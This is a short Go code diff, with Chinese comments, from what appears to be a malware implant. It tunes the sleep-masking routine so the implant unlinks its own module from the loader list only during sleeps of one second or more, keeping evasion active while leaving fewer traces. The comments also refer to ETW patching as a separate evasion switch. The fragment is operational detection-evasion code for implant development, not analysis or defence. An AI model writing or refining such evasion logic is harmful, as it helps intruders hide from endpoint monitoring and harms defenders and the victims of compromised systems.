@@ -131,7 +131,11 @@ func SleepMask(d time.Duration) {
 	// 门控是独立的 sleepMaskHide 开关（P4 从"任一主机层对抗开着"里拆出来）——
 	// 摘链能降低模块枚举可见度，但破坏了加载器一致性，不该被 ETW patch 之类
 	// 无关开关顺带打开。失败/未启用时是空操作。
-	restoreModule := evasion.HideForSleep(config.SleepMaskHideEnabled())
+	//
+	// 只对"像样的睡眠"摘链：交互式终端活跃时轮询会缩到 150ms（runloop 的
+	// fastPollInterval），那时每秒要摘/挂 7 次——摘链是改链表指针的多步操作，
+	// 高频做既没掩护价值（几毫秒窗口）又平白增加可见痕迹。1s 以下不摘。
+	restoreModule := evasion.HideForSleep(config.SleepMaskHideEnabled() && d >= time.Second)
 	defer restoreModule()
 
 	deadline := time.Now().Add(d)
